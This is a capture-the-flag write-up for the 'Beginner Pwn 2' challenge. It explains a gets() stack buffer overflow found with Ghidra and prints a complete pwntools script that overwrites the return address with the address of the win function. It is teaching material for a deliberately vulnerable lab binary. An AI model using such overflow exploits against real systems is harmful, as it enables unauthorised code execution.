# Beginner Pwn 2
Writeup by: Ethan Andrews (UofUsec)

## Description
In this challenge there is a function which is not called. Can you fix that?

## Writeup
### Initial Looks
Executing the binary file, it appears to query the user input, and then prints it out.

![image](https://github.com/user-attachments/assets/711a8998-5c08-4dbf-8aee-fe0e23963c91)

### Code Analysis
We can decompile this binary using Ghidra to take a look at the actual C code.

![image](https://github.com/user-attachments/assets/034909a8-8bed-489d-9e3c-d26def687d2f)

We can see that it uses gets() to read into buf. This immediately means we can buffer overflow. 

We also see the win function.

![image](https://github.com/user-attachments/assets/97bb1686-d082-4ff2-8b3d-333766f71b39)

### Exploit Construction
We will construct the exploit using pwntools.

```python
from pwn import *

exe = ELF("./binary")
p = process("./binary")
```

First, we will execute this code to determine what protections the binary contains.

![image](https://github.com/user-attachments/assets/1355d50a-2d29-4806-af03-cde37b5cee36)

We can see that the binary does not have PIE and it is not stripped. We also see that it
is a 64 bit binary. This makes the exploit a relatively straightforward stack smashing challenge.

Because we know that the buffer is the only variable inside the function. We can determine exactly how many bytes to pad the input
with in order to overflow to the return address. The buffer is 10 bytes long, and the EBP is 8 bytes. This means we pad the payload
with 18 bytes in total.

```python
payload = b"\x90" * 18
```

Now, since the binary is not stripped, we can simply load the address of the win function from the symbols table and add it to
the end of the payload.

```python
payload += p64(exe.symbols['win'])
payload += b"\n"
```

Then we can send the payload and receive the response giving us the final exploit:

```python
from pwn import *

exe = ELF("./binary")

# Switch to the remote process to obtain the real flag
# p = remote(....)
p = process("./binary")

payload = b"\x90" * 18
payload += p64(exe.symbols['win'])
payload += b"\n"

p.send(payload)
print(p.recv())

p.interactive()
```

Executing this gives us the flag.

## Important Concepts
- Ghidra
- Buffer Overflow
- Stack Smashing
